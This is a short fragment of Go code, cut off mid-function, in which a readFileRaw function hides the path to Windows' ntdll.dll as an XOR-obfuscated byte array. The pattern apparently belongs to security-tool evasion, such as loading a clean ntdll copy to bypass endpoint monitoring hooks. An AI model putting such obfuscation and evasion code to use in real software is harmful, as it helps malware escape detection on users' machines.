...
func readFileRaw() ([]byte, error) {
	// C:\Windows\System32\ntdll.dll XOR加密
	encPath := []byte{0x3C, 0x45, 0x23, 0x28, 0x16, 0x11, 0x1B, 0x10, 0x08, 0x0C, 0x23, 0x2C, 0x06, 0x0C, 0x0B, 0x1A, 0x12, 0x4C, 0x4D, 0x23, 0x11, 0x0B, 0x1B, 0x13, 0x13, 0x51, 0x1B, 0x13, 0x13}
